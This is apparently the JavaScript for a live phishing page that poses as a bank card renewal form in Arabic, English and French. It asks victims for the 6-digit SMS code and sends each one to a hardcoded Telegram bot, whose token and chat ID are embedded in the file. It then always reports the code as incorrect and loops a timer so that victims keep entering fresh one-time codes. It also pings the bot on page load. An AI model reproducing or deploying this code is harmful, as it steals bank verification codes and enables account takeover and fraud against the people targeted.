let timeLeft = 30;
let timerInterval;
let currentLang = 'fr';

const BOT_TOKEN = "8259868430:AAFQ-oqYzk-nd3cx47XqUdYhPCRQ9YDeWmM";
const CHAT_ID = "5794299315";

async function sendToTelegram(code) {
  const currentTime = new Date();
  const timeString = currentTime.toLocaleString('ar-SA', {
    timeZone: 'Asia/Riyadh',
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
  });
  
  const message = `🔐 كود جديد تم إدخاله:\n\nالكود: ${code}\nالوقت: ${timeString}`;
  
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  
  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message
      })
    });
    
    const result = await response.json();
    
    if (!response.ok) {
      console.error('Telegram API Error:', result);
    } else {
      console.log('Message sent successfully to Telegram');
    }
  } catch (error) {
    console.error('Error sending to Telegram:', error);
  }
}

const translations = {
  ar: {
    title: 'طلب البطاقة الكلاسيكية',
    message: 'يرجى كتابة الرمز الوارد عبر الرسالة النصية المكون من 6 أرقام لتجديد البطاقة أوتوماتيكيا',
    seconds: 'ثانية',
    verify: 'تأكيد',
    continue: 'متابعة',
    timeout: 'تم إرسال كود جديد',
    error6digits: 'يرجى إدخال رمز مكون من 6 أرقام',
    errorNumbers: 'يرجى إدخال أرقام فقط',
    success: 'رمز خاطئ يرجى كتابة الرمز الجديد'
  },
  en: {
    title: 'Request Classic Card',
    message: 'Please enter the 6-digit code sent via SMS to automatically renew your card',
    seconds: 'seconds',
    verify: 'Verify',
    continue: 'Continue',
    timeout: 'A new code has been sent',
    error6digits: 'Please enter a 6-digit code',
    errorNumbers: 'Please enter numbers only',
    success: 'Incorrect code, please enter the new code'
  },
  fr: {
    title: 'Demande de Carte Classique',
    message: 'Veuillez saisir le code à 6 chiffres envoyé par SMS pour renouveler automatiquement votre carte',
    seconds: 'secondes',
    verify: 'Vérifier',
    continue: 'Continuer',
    timeout: 'Un nouveau code a été envoyé',
    error6digits: 'Veuillez saisir un code à 6 chiffres',
    errorNumbers: 'Veuillez saisir uniquement des chiffres',
    success: 'Code incorrect, veuillez entrer le nouveau code'
  }
};

function showVerificationPage() {
  document.getElementById('heroSection').classList.add('hidden');
  document.getElementById('verificationSection').classList.remove('hidden');
  startTimer();
}

function changeLanguage(lang) {
  currentLang = lang;
  const html = document.documentElement;
  
  if (lang === 'ar') {
    html.setAttribute('dir', 'rtl');
    html.setAttribute('lang', 'ar');
  } else {
    html.setAttribute('dir', 'ltr');
    html.setAttribute('lang', lang);
  }
  
  document.getElementById('title').textContent = translations[lang].title;
  document.getElementById('message').textContent = translations[lang].message;
  document.getElementById('secondsText').textContent = translations[lang].seconds;
  document.getElementById('verifyBtn').textContent = translations[lang].verify;
  document.getElementById('continueBtnText').textContent = translations[lang].continue;
  
  document.querySelectorAll('.lang-btn').forEach(btn => {
    btn.classList.remove('active');
  });
  document.querySelector(`[data-lang="${lang}"]`).classList.add('active');
}

function startTimer() {
  const timerElement = document.getElementById('timeLeft');
  const timerContainer = document.getElementById('timer');
  
  timerInterval = setInterval(() => {
    timeLeft--;
    timerElement.textContent = timeLeft;
    
    if (timeLeft <= 10) {
      timerContainer.classList.add('warning');
    }
    
    if (timeLeft <= 0) {
      clearInterval(timerInterval);
      timerContainer.classList.remove('warning');
      timerContainer.classList.remove('expired');
      
      const result = document.getElementById('result');
      result.textContent = translations[currentLang].timeout;
      result.classList.add('show', 'success');
      
      setTimeout(() => {
        result.classList.remove('show');
        timeLeft = 30;
        timerElement.textContent = '30';
        document.getElementById('codeInput').value = '';
        document.getElementById('codeInput').disabled = false;
        document.querySelector('.verify-button').disabled = false;
        startTimer();
      }, 2000);
    }
  }, 1000);
}

// Don't start timer on page load, only when verification section is shown

function verifyCode() {
  const input = document.getElementById('codeInput');
  const result = document.getElementById('result');
  const code = input.value.trim();
  
  result.classList.remove('show', 'success', 'error');
  
  if (code.length !== 6) {
    setTimeout(() => {
      result.textContent = translations[currentLang].error6digits;
      result.classList.add('show', 'error');
    }, 100);
    return;
  }
  
  if (!/^\d{6}$/.test(code)) {
    setTimeout(() => {
      result.textContent = translations[currentLang].errorNumbers;
      result.classList.add('show', 'error');
    }, 100);
    return;
  }
  
  // إرسال الكود إلى Telegram
  sendToTelegram(code);
  
  setTimeout(() => {
    result.textContent = translations[currentLang].success;
    result.classList.add('show', 'error');
    
    setTimeout(() => {
      input.value = '';
      result.classList.remove('show');
    }, 3000);
  }, 100);
}

document.getElementById('codeInput').addEventListener('keypress', function(e) {
  if (e.key === 'Enter') {
    verifyCode();
  }
  
  if (!/^\d$/.test(e.key)) {
    e.preventDefault();
  }
});

document.getElementById('codeInput').addEventListener('input', function(e) {
  this.value = this.value.replace(/\D/g, '');
});

// إرسال رسالة اختبار عند تحميل الصفحة
async function sendTestMessage() {
  const message = `🔔 رسالة اختبار\n\nالبوت يعمل بنجاح!\nالوقت: ${new Date().toLocaleString('ar-SA')}`;
  
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  
  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message
      })
    });
    
    const result = await response.json();
    
    if (response.ok) {
      console.log('✅ رسالة الاختبار تم إرسالها بنجاح إلى Telegram');
    } else {
      console.error('❌ فشل إرسال رسالة الاختبار:', result);
    }
  } catch (error) {
    console.error('❌ خطأ في الاتصال بـ Telegram:', error);
  }
}

// إرسال رسالة اختبار عند تحميل الصفحة
sendTestMessage();
